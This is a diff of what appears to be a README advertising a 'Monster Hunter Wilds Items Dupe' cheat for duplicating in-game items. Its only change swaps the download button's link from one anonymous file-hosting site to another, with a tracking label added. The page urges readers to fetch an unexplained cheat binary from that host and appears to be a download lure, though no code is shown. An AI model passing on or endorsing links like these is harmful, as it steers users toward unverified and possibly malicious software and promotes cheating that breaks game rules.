@@ -2,7 +2,7 @@
 
 Monster Hunter Wilds Items Dupe is a cheat or exploit that allows players to duplicate in-game items, providing them with unlimited resources, materials, and gear. This cheat can be used to bypass the normal process of gathering or crafting items, making it easier to upgrade weapons, armor, and other equipment without grinding for resources. 
 
-[![Download MHW items duper](https://img.shields.io/badge/Download-MHWcheat%20-blueviolet)](https://downeefiles.com/s/mhwid)
+[![Download MHW items duper](https://img.shields.io/badge/Download-MHWcheat%20-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
 
 ### Key Features:
 - **Unlimited Resources**:  
